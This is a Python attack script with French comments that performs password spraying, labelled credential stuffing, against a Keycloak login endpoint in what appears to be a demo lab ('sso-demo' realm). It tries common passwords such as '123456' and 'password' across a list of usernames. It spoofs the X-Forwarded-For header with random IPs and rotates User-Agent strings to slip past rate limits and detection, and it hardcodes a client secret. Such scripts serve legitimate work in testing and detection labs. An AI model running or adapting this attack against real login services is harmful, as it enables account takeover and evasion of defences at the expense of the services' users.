"""
Attaque 2 : CREDENTIAL STUFFING
================================
On teste 1 mot de passe commun sur plein de comptes différents
+ on simule des IPs différentes via le header X-Forwarded-For
(fonctionne si Keycloak est derrière un proxy de confiance).

Sinon, on peut faire varier le User-Agent pour rester détectable autrement.

Lance :
    python credential_stuffing.py http://<ip-ubuntu>:8080
"""
import sys
import time
import random
import requests

KEYCLOAK_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
REALM        = "sso-demo"
CLIENT_ID    = "ticket-app"
CLIENT_SECRET= "ticket-app-secret"

USERNAMES = ["alice", "bob", "charlie", "david", "eve", "frank", "grace",
             "henry", "ivy", "jack", "kate", "leo", "mia", "noah", "olivia"]

COMMON_PWDS = ["123456", "password", "admin", "qwerty"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64) Chrome/120.0",
    "python-requests/2.31",
    "curl/7.81.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
    "BadBot/1.0",
]

def random_ip():
    """Génère une IP aléatoire pour simuler des sources différentes."""
    return f"{random.choice([203, 185, 196, 41])}.{random.randint(1,254)}." \
           f"{random.randint(1,254)}.{random.randint(1,254)}"

def try_login(username, password):
    url = f"{KEYCLOAK_URL}/realms/{REALM}/protocol/openid-connect/token"
    headers = {
        "User-Agent":     random.choice(USER_AGENTS),
        "X-Forwarded-For":random_ip(),  # ne marche que si Keycloak fait confiance
    }
    data = {
        "grant_type":   "password",
        "client_id":    CLIENT_ID,
        "client_secret":CLIENT_SECRET,
        "username":     username,
        "password":     password,
    }
    try:
        r = requests.post(url, data=data, headers=headers, timeout=5)
        return r.status_code == 200, headers
    except Exception:
        return False, headers


print(f"[*] Credential stuffing : {len(USERNAMES)} users x {len(COMMON_PWDS)} pwds")
print(f"[*] Cible : {KEYCLOAK_URL}\n")

n = 0
for pwd in COMMON_PWDS:
    for user in USERNAMES:
        n += 1
        ok, h = try_login(user, pwd)
        ip_used = h["X-Forwarded-For"]
        ua_used = h["User-Agent"][:30]
        mark = "✓" if ok else "✗"
        print(f"  [{n:3d}] {user:10s} / {pwd:10s} from={ip_used:15s} ua={ua_used:30s} {mark}")
        time.sleep(0.2)

print("\n[*] Terminé.")
